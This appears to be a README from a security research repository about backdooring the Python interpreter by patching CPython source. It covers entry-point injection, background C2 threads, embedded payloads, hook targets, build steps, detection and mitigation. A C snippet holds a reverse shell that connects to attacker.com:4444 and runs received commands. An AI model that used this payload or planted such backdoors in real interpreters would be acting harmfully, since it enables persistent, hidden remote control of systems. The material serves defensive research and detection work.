# Malicious Interpreter

**System-Level Python Compromise via Interpreter Modification**

## Overview

Malicious interpreter attacks represent the highest level of Python supply chain compromise — modifying the Python interpreter binary itself. This ensures code execution for ALL Python programs on the system, making detection and remediation extremely difficult.

### Attack Goals

- **Maximum Persistence** — Affects all Python code executed on system
- **System-Wide Impact** — Cannot be bypassed without interpreter replacement
- **Privilege Elevation** — Executes with Python process privileges
- **Stealthy Execution** — Code executes before user Python code
- **Undetectable** — Standard tools cannot reveal compromise

### Attack Execution Timeline

```
Python Source Code Obtained
        ↓
Malicious Code Injected into Source
        ↓
Python Recompiled from Modified Source
        ↓
Modified Interpreter Installed
        ↓
ALL Python Invocations Execute Malicious Code
```

### Risk Assessment

| Aspect | Risk Level | Rationale |
|--------|-----------|-----------|
| **Scope** | CRITICAL | Affects all Python execution on system |
| **Detection** | CRITICAL | Standard forensics won't reveal |
| **Evasion** | CRITICAL | Code runs before Python runtime |
| **Impact** | CRITICAL | Complete system compromise |
| **Remediation** | HIGH | Requires full Python reinstall |

## Attack Techniques

### Malinterp1: Code Injection at Interpreter Entrypoint

Inject malicious code at Python's main entry point before initialization.

**Mechanism**:
- Modify `Modules/main.c` to execute code before Py_Main()
- Code executes immediately when interpreter starts
- Runs before Python runtime initialization
- Allows direct system calls (fork, execve, etc.)

**Execution Point**: Before Python initialization

**Complexity**: Medium (requires C knowledge, limited by pre-init environment)

**Advantages**:
- Executes very early
- Full C-level access
- Can spawn child processes directly

**Limitations**:
- Must avoid dependencies not yet initialized
- Cannot use Python APIs yet
- Limited error handling

### Malinterp2: Payload Execution on New Thread

Spawn background thread for malicious code while keeping interpreter responsive.

**Mechanism**:
- Inject threading code into interpreter initialization
- Create thread for C2 communication, credential theft, etc.
- Main Python execution continues normally
- Malicious thread runs in background

**Execution Point**: During interpreter initialization (Py_Initialize)

**Complexity**: Medium-High (thread synchronization, race conditions)

**Advantages**:
- Doesn't block main interpreter
- Python code executes normally (less suspicious)
- Maintains persistence while allowing normal operation
- Harder to detect (separate execution context)

**Example Use Cases**:
- C2 beacon running in background
- Credential harvesting while programs run
- Log data exfiltration

### Malinterp3: Embedded Python Code Execution

Embed and execute Python code from within the C interpreter.

**Mechanism**:
- Embed malicious Python code as string in C source
- Use PyRun_SimpleString() or similar to execute Python code
- Allows complex payloads while maintaining C interface
- Can access Python APIs and standard library

**Execution Point**: During Python initialization

**Complexity**: Medium (requires understanding Python C API)

**Advantages**:
- Can use full Python standard library
- Complex payloads easily expressed in Python
- Easier to write and modify than pure C
- Can import modules and use full Python features

**Example**:
```c
const char *malicious_code = 
    "import socket\n"
    "import subprocess\n"
    "s = socket.socket()\n"
    "s.connect(('attacker.com', 4444))\n"
    "subprocess.call(s.recv(1024), shell=True)\n";

PyRun_SimpleString(malicious_code);
```

## Modification Targets

### Interpreter Initialization (Py_Initialize)

**File**: `Modules/main.c`

Key initialization points:
- `pymain_run()` — Main execution function
- `Py_Initialize()` — Runtime initialization
- `_Py_RunStartupAndSite()` — Startup hooks

### Built-in Modules

**Files**: `Modules/` directory

Can inject into:
- `socketmodule.c` — Network communication
- `osmodule.c` — System calls
- `sysmodule.c` — System parameters

### Python/C Interface

**Files**: `Python/ceval.c`, `Python/pythonrun.c`

Deep hooking points:
- `_PyEval_EvalFrameEx()` — Frame evaluation
- `PyEval_CallFunction()` — Function calls
- `_PyObject_Call()` — Object method calls

## Detection & Mitigation

### Detection Strategies

1. **Binary Verification**
   - Checksum/hash verification of Python binary
   - Code signature verification
   - Binary comparison against known good copy
   - File integrity monitoring (FIM) on Python installation

2. **Behavioral Monitoring**
   - Monitor subprocess spawning by Python
   - Alert on unexpected network connections
   - Track system calls during Python startup
   - Monitor process creation and file access

3. **Memory Analysis**
   - Inspect Python process memory for injected code
   - Check for unexpected thread creation
   - Analyze call stack for suspicious entries
   - Memory forensics and dump analysis

4. **Runtime Inspection**
   - Compare running interpreter with source code
   - Verify built-in modules haven't been modified
   - Inspect Python bytecode for anomalies
   - Check sys.modules for injected modules

### Mitigation Strategies

1. **Prevention**
   - Install Python only from trusted sources
   - Use package manager (apt, brew, yum) when possible
   - Verify checksums/signatures on source downloads
   - Use verified binary distributions (python.org, official vendors)

2. **Detection**
   - Implement binary integrity monitoring
   - Regular hash verification of Python installation
   - Monitor for unauthorized modifications
   - Alert on suspicious interpreter behavior

3. **Isolation**
   - Run Python in containers/sandboxes
   - Use AppArmor or SELinux to restrict capabilities
   - Minimize Python privileges (non-root execution)
   - Separate execution environments by privilege level

4. **Response**
   - Complete Python reinstallation if compromise suspected
   - Rebuild Python from verified source code
   - Full system patching and hardening
   - Forensic analysis to determine extent of compromise

## Building & Testing

### Prerequisites

- GCC/Clang compiler
- Python development tools
- Build essentials (make, autoconf, etc.)
- OpenSSL development libraries

### Basic Build Process

```bash
# Download Python source
wget https://www.python.org/ftp/python/3.11.9/Python-3.11.9.tar.xz
tar -xf Python-3.11.9.tar.xz
cd Python-3.11.9

# Apply malicious patch
patch -p1 < ../malinterp1.patch

# Configure with specific paths (avoid overwriting system Python)
./configure --prefix=/opt/python-modified

# Build and install
make -j$(nproc)
make install

# Verify with custom interpreter
/opt/python-modified/bin/python3 --version
```

### Safe Testing Environment

**IMPORTANT**: Only test in isolated lab environment:

```bash
# Use virtual machine or container
docker run -it ubuntu:latest bash

# Inside container:
# - Download and patch Python
# - Install to /opt
# - Test behavior
# - Document results
# - Completely destroy container after testing
```

## Samples

Base Python version: **3.11.9** (downloadable from python.org)

Each sample includes:
- `README.md` — Explanation of injection technique
- `.patch` file — Diff against Python 3.11.9 source
- `requirements.txt` — Build dependencies
- `test.py` — Validation/demonstration script

## Disclaimer

Interpreter-level modifications represent the highest level of system compromise. These techniques should ONLY be tested in:

- **Isolated lab environments** (no network access)
- **Disposable virtual machines** (completely destroyed after testing)
- **Authorized penetration testing engagements** (with documented approval)
- **Academic research** (with ethics review and institutional approval)

Unauthorized modification of Python interpreters is illegal and highly unethical.